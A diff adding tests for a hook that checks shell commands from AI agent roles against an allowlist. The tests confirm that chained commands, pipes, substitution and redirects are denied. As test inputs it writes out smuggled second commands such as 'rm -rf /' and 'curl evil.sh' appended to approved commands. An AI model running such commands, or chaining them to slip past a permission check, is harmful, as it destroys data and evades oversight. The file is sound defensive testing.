@@ -105,3 +105,133 @@ def test_implementer_opted_in_emits_approve(fake_project, settings_writer):
     assert r.returncode == 0
     d = _decision(r.stdout)
     assert d is not None and d["decision"] == "approve", r.stdout
+
+
+# ---------------------------------------------------------------------------
+# Simple-command enforcement (shlex-based): close the substring-bypass hole
+# where `harness-monitor; rm -rf /` or `pytest && curl evil.sh` would have
+# been approved by the leading-script match.
+# ---------------------------------------------------------------------------
+
+def test_harness_script_with_trailing_compound_denied(fake_project):
+    r = run_hook("role_bash_allowlist.py",
+                 _bash("functional-harness:tester",
+                       "harness-monitor; rm -rf /"),
+                 project_dir=fake_project)
+    assert r.returncode == 2, r.stdout
+    assert "';'" in r.stderr or "shell-operator" in r.stderr
+
+
+def test_allowlisted_command_with_trailing_compound_denied(fake_project, settings_writer):
+    settings_writer(tester_bash_allowlist=[r"^pytest(\s|$)"])
+    r = run_hook("role_bash_allowlist.py",
+                 _bash("functional-harness:tester", "pytest && curl evil.sh"),
+                 project_dir=fake_project)
+    assert r.returncode == 2, r.stdout
+
+
+def test_pipe_denied(fake_project):
+    r = run_hook("role_bash_allowlist.py",
+                 _bash("functional-harness:tester",
+                       "harness-monitor | tee /tmp/sniff"),
+                 project_dir=fake_project)
+    assert r.returncode == 2, r.stdout
+
+
+def test_command_substitution_dollar_denied(fake_project):
+    r = run_hook("role_bash_allowlist.py",
+                 _bash("functional-harness:implementer",
+                       "echo $(harness-monitor)"),
+                 project_dir=fake_project)
+    assert r.returncode == 2, r.stdout
+
+
+def test_command_substitution_backtick_denied(fake_project):
+    r = run_hook("role_bash_allowlist.py",
+                 _bash("functional-harness:implementer",
+                       "echo `harness-monitor`"),
+                 project_dir=fake_project)
+    assert r.returncode == 2, r.stdout
+
+
+def test_redirection_denied(fake_project, settings_writer):
+    settings_writer(tester_bash_allowlist=[r"^pytest(\s|$)"])
+    r = run_hook("role_bash_allowlist.py",
+                 _bash("functional-harness:tester",
+                       "pytest > /tmp/sniff"),
+                 project_dir=fake_project)
+    assert r.returncode == 2, r.stdout
+
+
+def test_fd_redirect_2_to_1_denied(fake_project, settings_writer):
+    settings_writer(tester_bash_allowlist=[r"^pytest(\s|$)"])
+    r = run_hook("role_bash_allowlist.py",
+                 _bash("functional-harness:tester",
+                       "pytest tests/foo.py 2>&1"),
+                 project_dir=fake_project)
+    assert r.returncode == 2, r.stdout
+
+
+def test_background_ampersand_denied(fake_project):
+    r = run_hook("role_bash_allowlist.py",
+                 _bash("functional-harness:tester",
+                       "harness-monitor &"),
+                 project_dir=fake_project)
+    assert r.returncode == 2, r.stdout
+
+
+def test_quoted_message_with_semicolon_allowed(fake_project):
+    """The append message may legitimately contain `;` — it's inside a
+    quoted argument, not a shell separator."""
+    r = run_hook("role_bash_allowlist.py",
+                 _bash("functional-harness:implementer",
+                       "harness-append 'stop-request: tried foo; nothing works'"),
+                 project_dir=fake_project)
+    assert r.returncode == 0, r.stderr
+    d = _decision(r.stdout)
+    assert d is not None and d["decision"] == "approve"
+
+
+def test_quoted_grep_with_angle_brackets_allowed(fake_project, settings_writer):
+    """C++ generics like `grep '<T>'` — the brackets are inside a quoted
+    argument, not unquoted shell redirection."""
+    settings_writer(tester_bash_allowlist=[r"^grep(\s|$)"])
+    r = run_hook("role_bash_allowlist.py",
+                 _bash("functional-harness:tester",
+                       "grep '<T>' src/main.cpp"),
+                 project_dir=fake_project)
+    assert r.returncode == 0, r.stderr
+    d = _decision(r.stdout)
+    assert d is not None and d["decision"] == "approve"
+
+
+def test_unquoted_angle_brackets_denied(fake_project, settings_writer):
+    """If the agent forgets to quote, the bare `<` is shell redirection
+    in bash semantics — rejecting is correct."""
+    settings_writer(tester_bash_allowlist=[r"^grep(\s|$)"])
+    r = run_hook("role_bash_allowlist.py",
+                 _bash("functional-harness:tester", "grep <T> src/main.cpp"),
+                 project_dir=fake_project)
+    assert r.returncode == 2, r.stdout
+
+
+def test_dollar_var_expansion_still_allowed(fake_project):
+    """`$VAR` expansion is benign; only `$(...)` substitution is denied."""
+    r = run_hook("role_bash_allowlist.py",
+                 _bash("functional-harness:tester",
+                       'harness-append "$HOME owner"'),
+                 project_dir=fake_project)
+    assert r.returncode == 0, r.stderr
+
+
+def test_leading_env_assignment_then_harness_script_allowed(fake_project):
+    """agent_env_inject prepends `AGENT_TYPE=... AGENT_ID=... <cmd>`.
+    The leading-program lookup must skip env assignments to find the
+    real program token."""
+    r = run_hook("role_bash_allowlist.py",
+                 _bash("functional-harness:implementer",
+                       "AGENT_TYPE=functional-harness:implementer AGENT_ID=x harness-append 'hi'"),
+                 project_dir=fake_project)
+    assert r.returncode == 0, r.stderr
+    d = _decision(r.stdout)
+    assert d is not None and d["decision"] == "approve"
